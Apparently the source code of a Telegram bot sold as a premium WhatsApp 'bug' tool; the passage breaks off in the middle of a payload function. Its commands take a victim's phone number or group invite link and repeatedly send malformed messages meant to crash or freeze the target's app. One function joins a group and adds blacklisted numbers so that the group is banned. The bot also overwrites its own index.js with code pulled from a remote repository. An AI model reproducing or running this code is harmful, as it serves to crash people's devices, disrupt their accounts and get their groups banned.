<blockquote><strong>𝚂𝙴𝚃𝚃𝙸𝙽𝙶𝚂 𝚂𝙴𝙽𝙳𝙴𝚁</strong></blockquote>
↯ /addsender - tambah akses
↯ /delsesi - reset sesi
<blockquote><strong>𝚂𝙴𝚃𝚃𝙸𝙽𝙶𝚂 𝙰𝙳𝙼𝙸𝙽</strong></blockquote>
↯ /addadmin - tambah admin
↯ /deladmin - hapus admin
↯ /listadmin - list admin
<blockquote><strong>𝚂𝙴𝚃𝚃𝙸𝙽𝙶𝚂 𝚄𝚂𝙴𝚁͒</strong></blockquote>
↯ /addprem - premium user
↯ /delprem - hapus premium user
↯ /cekprem - cek status
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "「🔙」⌯ BACK ", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("all_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
      const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";
      
      const mainMenuMessage = `
tools masi dalam tahap pengembangan
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "「🔙」⌯ BACK ", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("bug_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
      const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";
      
  const mainMenuMessage = `
<blockquote><strong>𝑆𝑐𝑎𝑟𝑦 𝐷𝑒𝑎𝑡ℎ</strong></blockquote>
↯ Developer  : @Padukayoo
↯ Version    : Automation updated
↯ Platform   : Telegram
↯ type script : Premium type
<blockquote><strong>𝙰𝙽𝙳𝚁𝙾𝙸𝙳 𝙼𝙴𝙽𝚄</strong></blockquote>
↯ /intelens ⇢ Delay Invisible 
↯ /croysan ⇢ Crash & delay Infinity 
↯ /necroys ⇢ Crash & delay Invisible 
<blockquote><strong>𝙶𝚁𝙾𝚄𝙿 𝙼𝙴𝙽𝚄</strong></blockquote>
↯ /fcgroup ⇢ Forcelose Visible 
↯ /xvioletgb ⇢ Freeze Delay Invisible 
↯ /bannido ⇢ Band Group 
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "「🔙」⌯ BACK ", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});

bot.action("back", async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username || 'Tidak ada';
  const id = userId;
  const isPremium = !!(await PremiumModel.findOne({ userId }));
  const waStatus = sock && sock.user ? "✅ Terhubung" : "❌ Tidak Terhubung";
  const waktuRunPanel = runtime(process.uptime());
      
  const mainMenuMessage = `<blockquote> <tg-emoji emoji-id="4958472587123360612">🌸</tg-emoji> <b>〔 X-Flower 〕</b>
ᴀᴠᴏɪᴅ - xᴛɪᴍᴇ ʜᴀs ᴀʀʀɪᴠᴇᴅ. ᴇᴠᴇʀʏᴏɴᴇ, ᴋɴᴇᴇʟ ʙᴇғᴏʀᴇ ʜɪᴍ ɪᴍᴍᴇᴅɪᴀᴛᴇʟʏ.
━━━━━━━━━━━━━━━━━━━━━━
┋<tg-emoji emoji-id="4956420859771225351">👑</tg-emoji> ᴅᴇᴠᴇʟᴏᴘᴇʀ : @Padukayoo 
┋<tg-emoji emoji-id="6028306016653807599">🪩</tg-emoji> sʏsᴛᴇᴍ : Auto-Update
┋<tg-emoji emoji-id="5897659291967426441">🌕</tg-emoji> ᴠᴇʀsɪᴏɴ : 8.0
┋<tg-emoji emoji-id="4994520423732348068">🌟</tg-emoji> sᴛᴀᴛᴜs : Premium Verified <tg-emoji emoji-id="4958610528588008305">✅</tg-emoji></blockquote>
<blockquote><b>〔 Informasi Bot 〕</b>
━━━━━━━━━━━━━━━━━━━━━━
⍑<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> sᴛᴀᴛᴜs sᴇɴᴅᴇʀ : ${waStatus}
⍑<tg-emoji emoji-id="5893102202817352158">🕞</tg-emoji> ʀᴜɴᴛɪᴍᴇ sᴛᴀᴛᴜs : ${waktuRunPanel}
⍑<tg-emoji emoji-id="4972406813946282823">👤</tg-emoji> ᴜsᴇʀɴᴀᴍᴇ : ${username}
⍑<tg-emoji emoji-id="5895444149699612825">📊</tg-emoji> ᴜsᴇʀ ɪᴅ : ${id}</blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const mainKeyboard = [
    [
      {
        text: "XTOOLS",
        callback_data: "all_menu",
        style: 'primary',
      },
    ],
    [
      {
        text: "XBUGS",
        callback_data: "bug_menu",
        style: 'danger',
      },
      {
        text: "XSETTINGS",
        callback_data: "owner_menu",
        style: 'danger',
      },
    ],
    [
      {
        text: "CHANEL",
        url: "https://t.me/XflowersInformation",
        style: 'success',
      },
    ]
  ];
  
  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});

// ==========================================
// SISTEM AUTO UPDATE KODE VIA TELEGRAM (MULTI FILE)
// ==========================================
bot.command("pullupdate", async (ctx) => doUpdate(ctx));

const UPDATE_URL =
  "https://raw.githubusercontent.com/theo-star227/xflowerupd/main/index.js"; 

const thumbnailUp = "https://files.catbox.moe/xd8m5h.jpg"; // gausah ganti ini ga berfungsi tapi semua code tetap jalan semua

const UPDATE_FILE_PATH = "./index.js"; 

function downloadToFile(url, filePath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filePath);

    https
      .get(url, (res) => {
        if (res.statusCode !== 200) {
          file.close(() => fs.unlink(filePath, () => {}));
          return reject(new Error(`HTTP_${res.statusCode}`));
        }

        res.pipe(file);

        file.on("finish", () => file.close(resolve));
      })
      .on("error", (err) => {
        file.close(() => fs.unlink(filePath, () => {}));
        reject(err);
      });
  });
}

async function doUpdate(ctx) {

  await ctx.reply(
`<pre>╭━━〔 ✨ 𝗔 𝗨 𝗧 𝗢 --- 𝗨 𝗣 𝗗 𝗔 𝗧 𝗘 ✨ 〕━━⬣
┃ ⨳ Status : 🔎 Intsall File index.js Terbaru....
┃ ⨳ Source : GitHub Repository File
┃ ⨳ Process : Downloading File 
╰━━━━━━━━━━━━━━━━⬣

⏳ <b>Sedang melakukan sinkronisasi script...</b>
<i>Mohon tunggu beberapa saat.</i>
</pre>`,
{
  parse_mode: "HTML",
});

  try {
    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);

    await ctx.reply(
`<pre>╭━━〔 ✨  𝗨 𝗣 𝗗 𝗔 𝗧 𝗘 --- 𝗦 𝗨 𝗖 𝗖 𝗘 𝗦 𝗦 ✨ 〕━━⬣
┃ ⨳ Status : ✅ Completed Download New File
┃ ⨳ File   : index.js
┃ ⨳ Source : GitHub Repository File
╰━━━━━━━━━━━━━━━━⬣

⏳ <b>Script berhasil mendownload new file index.js.</b>
♻️ <i>Automatic Restarting bot...</i>
</pre>`,
{
  parse_mode: "HTML",
}
);

    setTimeout(() => process.exit(0), 1500);
  } catch (e) {
    await ctx.reply(
`╭━━〔 ❌ 𝗨𝗣𝗗𝗔𝗧𝗘 𝗙𝗔𝗜𝗟𝗘𝗗 〕━━⬣
┃ ⨳ Status : Error
┃ ⨳ Action : Cancelled
╰━━━━━━━━━━━━━━━━⬣

<b>Sinkronisasi script gagal dilakukan.</b>

<blockquote><code>${String(e.message || e)}</code></blockquote>`,
{
  parse_mode: "HTML",
   }
  );
 }
}

//////// -- CASE TOOLS --- \\\\\\\\\\\
bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(
      text
    )}&isVideo=false`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });
    await ctx.replyWithSticker({ source: Buffer.from(res.data) });
  } catch (e) {
    console.error("Error saat membuat stiker:", e);
    ctx.reply("❌ Gagal membuat stiker brat.");
  }
});
bot.command("tiktokdl", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ ☇ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh video`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});
bot.command("iqc", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|yooganteng",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By yoo Offc ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});

// CASE BUG GB
function extractGroupCode(input) {
  const text = String(input || "").trim();
  const match = text.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/i);
  return match ? match[1] : null;
}

bot.command("bannido", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const link = ctx.message.text.split(" ")[1];
    if (!link) {
        return ctx.reply(`🪧 *Format:* /bannido https://chat.whatsapp.com/xxxxxx\n\n*Cara:* Kirim link undangan grup WhatsApp, bot akan otomatis join dan mengirim bug.`, { parse_mode: "Markdown" });
    }

    const inviteCode = extractGroupCode(link);
    if (!inviteCode) {
        return ctx.reply(`❌ *Link tidak valid!* Pastikan link undangan grup WhatsApp.\nContoh: https://chat.whatsapp.com/abc123xyz`, { parse_mode: "Markdown" });
    }

    const thumbnailURL = "https://files.catbox.moe/j99ze4.jpg";
    const processMsg = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailURL, {
        caption: `
<blockquote> Succeed Group Details ᝄ</blockquote>
⇢Target: ${link}
⇢Status: 🔄 Processing... (Join Grup)
⇢Command: /bannido
`,
        parse_mode: "HTML"
    });

    const processMsgId = processMsg.message_id;

    try {
        const groupJid = await sock.groupAcceptInvite(inviteCode);
        
        if (!groupJid) {
            throw new Error('Gagal join: groupJid kosong. Cek link atau bot sudah join sebelumnya.');
        }
        
        console.log(chalk.green(`✅ Berhasil join grup: ${groupJid}`));

        await ctx.telegram.editMessageCaption(ctx.chat.id, processMsgId, undefined, `
<blockquote> Succeed Group Details ᝄ</blockquote>
⇢Target: ${link}
⇢Group JID: ${groupJid}
⇢Status: ✅ Join Berhasil!
⇢Command: /bannido
`, { parse_mode: "HTML" });

        const totalSpam = 5;
        for (let i = 0; i < totalSpam; i++) {
            try {
                await groupBanFn(sock, groupJid);
            } catch (err) {
                console.log(`⚠️ Gagal kirim bug ke grup: ${err.message}`);
            }
            await sleep(1500);
            console.log(chalk.yellow(`📱 Blank bug ke grup ${groupJid} (${i+1}/${totalSpam})`));
        }

        await ctx.telegram.editMessageCaption(ctx.chat.id, processMsgId, undefined, `
<blockquote> Succeed Group Details ᝄ</blockquote>
⇢Target: ${link}
⇢Group JID: ${groupJid}
⇢Status: ✅ Success! ${totalSpam} bug terkirim
⇢Command: /bannido
`, { parse_mode: "HTML" });

    } catch (err) {
        console.error(chalk.red(`❌ Gagal: ${err.message}`));

        let errorMsg = err.message;
        if (errorMsg.includes('already') || errorMsg.includes('exist')) {
            errorMsg = 'Bot sudah pernah bergabung ke grup ini sebelumnya.';
        } else if (errorMsg.includes('invalid') || errorMsg.includes('expired')) {
            errorMsg = 'Link undangan tidak valid atau sudah kadaluarsa.';
        }

        await ctx.telegram.editMessageCaption(ctx.chat.id, processMsgId, undefined, `
<blockquote> Succeed Group Details ᝄ</blockquote>
⇢Target: ${link}
⇢Status: ❌ Gagal: ${errorMsg}
⇢Command: /bannido
`, { parse_mode: "HTML" });
    }
});

bot.command("fcgroup", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return ctx.reply(`Example:\n/fcgroup 120363xxxx@g.us\n/fcgroup https://chat.whatsapp.com/xxxx`);
  }

  let target;

  try {
    const input = String(q || "").trim();

    if (input.endsWith("@g.us")) {
      target = input;
    } else {
      const match = input.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/i);

      if (match && match[1]) {
        const info = await sock.groupGetInviteInfo(match[1]);
        if (!info?.id) throw new Error("Gagal ambil ID grup dari link.");
        target = info.id.endsWith("@g.us") ? info.id : `${info.id}@g.us`;
      } else {
        target = input.replace(/[^0-9]/g, "") + "@g.us";
      }
    }
  } catch (err) {
    console.error("Resolve GB error:", err);
    return ctx.reply("❌ Gagal mengambil ID grup dari link. Pastikan link valid.");
  }

  await ctx.sendPhoto("https://files.catbox.moe/1jwp7y.jpg", {
    caption: `<blockquote> Succeed Group Details ᝄ</blockquote>  
⇢Target: ${q}
⇢Group JID: ${target}
⇢Statused: Succes
⇢Command: /fcgroup
`,
    parse_mode: "HTML",
  });

  (async () => {
    for (let i = 0; i < 10; i++) {
      console.log(chalk.red(`Send Group Action ( fcgroup ) ${i + 1}/30 To ${target}`));
      await NewforceclsoeNursafah(sock, target);
      await sleep(3500);
    }
  })();
});
//
function extractGroupCode(input) {
  const text = String(input || "").trim();
  const match = text.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/i);
  return match ? match[1] : null;
}

async function resolveGbTarget(sock, q) {
  const input = String(q || "").trim();
  
  if (input.endsWith("@g.us")) return input;
  const code = extractGroupCode(input);
  if (code) {
    const info = await sock.groupGetInviteInfo(code);
    if (!info?.id) throw new Error("Gagal ambil ID grup dari link.");
    return info.id.endsWith("@g.us") ? info.id : `${info.id}@g.us`;
  }
  
  return input.replace(/[^0-9]/g, "") + "@g.us";
}

bot.command("xvioletgb", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return ctx.reply(`Example:\n/xvioletgb 120363xxxx@g.us\n/xvioletgb https://chat.whatsapp.com/xxxx`);
  }

  let target;

  try {
    target = await resolveGbTarget(sock, q);
  } catch (err) {
    console.error("Resolve GB error:", err);
    return ctx.reply("❌ Gagal mengambil ID grup dari link. Pastikan link valid.");
  }

  await ctx.sendPhoto("https://files.catbox.moe/1jwp7y.jpg", {
    caption: `<blockquote> Succeed Group Details ᝄ</blockquote>  
⇢Target: ${q}
⇢Group JID: ${target}
⇢Statused: Succes
⇢Command: /xvioletgb
`,
    parse_mode: "HTML",
  });

  (async () => {
    for (let i = 0; i < 10; i++) {
      console.log(chalk.red(`Send Group Action ( xvioletgb ) ${i + 1}/30 To ${target}`));
      await groupStatusMessageV2(sock, target);
      await sleep(1500);
    }
  })();
});

// -- CASE BUG BIASA --- \\
bot.command("croysan", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /croysan 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/1jwp7y.jpg", {
    caption: `<blockquote> Succeed Details ᝄ</blockquote>  
⇢Target: ${q}
⇢Statused: Succes
⇢Command: /croysan
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 20; i++) {
      console.log(chalk.red(`Send Bug ( croysan )  ${i + 1}/30 To ${q}`));
      await Crosual(sock, target);
      await sleep(2000);
      await DelayInvisSpam(sock, target);
      await sleep(1500);
    }
  })();
});

bot.command("intelens", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /intelens 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/1jwp7y.jpg", {
    caption: `<blockquote> Succeed Details ᝄ</blockquote>  
⇢Target: ${q}
⇢Statused: Succes
⇢Command: /intelens
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 10; i++) {
      console.log(chalk.red(`Send Bug ( intelens )  ${i + 1}/30 To ${q}`));
      await luffy(sock, target);
      await sleep(1500);
    }
  })();
});

bot.command("necroys", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /mecroys 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/1jwp7y.jpg", {
    caption: `<blockquote> Succeed Details ᝄ</blockquote>  
⇢Target: ${q}
⇢Statused: Succes
⇢Command: /necroys
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 10; i++) {
      console.log(chalk.red(`Send Bug ( necroys )  ${i + 1}/50 To ${q}`));
      await kres(sock, target);
      await sleep(1500);
      await crashx5(sock, target);
      await sleep(1500);
    }
  })();
});

bot.command("blockcmd", checkAdmin, async (ctx) => {
  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /blockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = await loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock)
      db.groupCmdBlock = {};

    if (!db.groupCmdBlock[groupId])
      db.groupCmdBlock[groupId] = [];

    // sudah ada
    if (db.groupCmdBlock[groupId].includes(cmd)) {
      return ctx.reply("⚠️ Command sudah diblock.");
    }

    db.groupCmdBlock[groupId].push(cmd);

    await saveDB(db);

    ctx.reply(`✅ Berhasil block command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});


// ===============================
// UNBLOCK CMD GROUP
// ===============================

bot.command("unblockcmd", checkAdmin, async (ctx) => {
  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /unblockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = await loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock?.[groupId]) {
      return ctx.reply("⚠️ Tidak ada command yang diblock.");
    }

    db.groupCmdBlock[groupId] =
      db.groupCmdBlock[groupId].filter(c => c !== cmd);

    await saveDB(db);

    ctx.reply(`✅ Berhasil unblock command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

bot.command("listblockcmd", async (ctx) => {
  try {
    const db = await loadDB();
    const chatId = String(ctx.chat.id);

    const blocked =
      db.groupCmdBlock?.[chatId] || [];

    if (blocked.length < 1) {
      return ctx.reply(
        "❌ Tidak ada command yang diblock."
      );
    }

    let teks = `📌 LIST BLOCK COMMAND\n\n`;

    blocked.forEach((cmd, i) => {
      teks += `${i + 1}. ${cmd}\n`;
    });

    ctx.reply(teks);

  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});
// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command("addadmin", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example: /addadmin 12345678");
  }

  const userId = args[1];

  const already = await AdminModel.findOne({ userId });
  if (already) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
  }

  await AdminModel.findOneAndUpdate({ userId }, { userId }, { upsert: true });

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
});
bot.command("addprem", checkAdmin, async (ctx) => {
  const args = ctx.message.text.trim().split(" "); 

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  const already = await PremiumModel.findOne({ userId });
  if (already) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
  }

  await PremiumModel.findOneAndUpdate({ userId }, { userId }, { upsert: true });

  return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
});
///=== comand del admin ===\\\
bot.command("deladmin", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /deladmin 12345678");
  }

  const userId = args[1];

  const exists = await AdminModel.findOne({ userId });
  if (!exists) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  await AdminModel.deleteOne({ userId });

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkAdmin, async (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /delprem 12345678");
  }

  const userId = args[1].toString();

  const exists = await PremiumModel.findOne({ userId });
  if (!exists) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  await PremiumModel.deleteOne({ userId });

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
});

// Perintah untuk mengecek status premium
bot.command("cekprem", async (ctx) => {
  const userId = ctx.from.id.toString();

  if (OWNER_IDS.includes(userId)) {
    return ctx.reply(`✅ Anda adalah Owner.`);
  }

  const isAdmin = await AdminModel.findOne({ userId });
  if (isAdmin) {
    return ctx.reply(`✅ Anda adalah Admin.`);
  }

  const isPremium = await PremiumModel.findOne({ userId });
  if (isPremium) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
bot.command("addsender", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("❌ Format Salah!. Example : /addsender <nomor_wa>");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (isWhatsAppConnected && sock && sock.user) {
    return await ctx.reply("Whatsapp Sudah Terhubung");
  }

  try {
    const code = await sock.requestPairingCode(phoneNumber, "YOOGNTNG");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃☇ 𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}
┃☇ 𝗖𝗼𝗱𝗲 : <code>${formattedCode}</code>
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "dєvєlσpєrs", url: "https://t.me/Padukayoo" }]],
      },
    });
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("❌ Gagal melakukan pairing !");
  }
});
///=== comand del sesi ===\\\\
bot.command("delsesi", (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("✅ Session berhasil di hapus, silahkan connect ulang");
  } else {
    ctx.reply("❌ Tidak ada session yang tersimpan saat ini.");
  }
});
////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}

////////// OWNER MENU \\\\\\\\\
bot.command("Status", checkOwner, async (ctx) => {
  try {
    const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";

    const message = `
<blockquote>
━━━━━━━━━━━━━━━━━━━━
› 𝘄𝗵𝗮𝘁𝘀𝗮𝗽𝗽
━━━━━━━━━━━━━━━━━━━━
› 𝘀𝘁𝗮𝘁𝘂𝘀 : ${waStatus}
━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});
// FUNC GB
async function groupBanFn(sock, target) {
    if (!target || !target.endsWith("@g.us")) {
        throw new Error("Target harus berformat @g.us");
    }

    try {
        const illegalNumbers = [
            "13135550002@s.whatsapp.net",
            "12345678900@s.whatsapp.net",
            "19876543210@s.whatsapp.net",
            "15551234567@s.whatsapp.net",
            "18005551234@s.whatsapp.net",
            "447700900000@s.whatsapp.net",
            "447700900001@s.whatsapp.net",
            "447700900002@s.whatsapp.net",
            "971500000000@s.whatsapp.net",
            "971500000001@s.whatsapp.net",
        ];
        await Promise.all(
            illegalNumbers.map(num =>
                sock.groupParticipantsUpdate(target, [num], "add").catch(() => {})
            )
        );

        console.log(`✅ Group ban success: ${target}`);
        return true;

    } catch (e) {
        console.log(`❌ Group ban failed: ${e.message}`);
        throw e;
    }
}

async function NewforceclsoeNursafah(target) {
  try {
    await sock.relayMessage(target, {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [
              {
                messageType: 8,
                latexMetadata: {
                  text: "Nursafah Here Baby!!",
                  expressions: [
                    {
                      latexExpression: "NurSafah",
                      fontHeight: 9999999
                    }
                  ]
                }
              },
              {
                messageType: 3,
                mediaMetadata: {}
              },
              {
                messageType: 4,
                tableMetadata: {
                  title: "\0",
                  rows: [
                    {
                      items: [],
                      isHeading: true
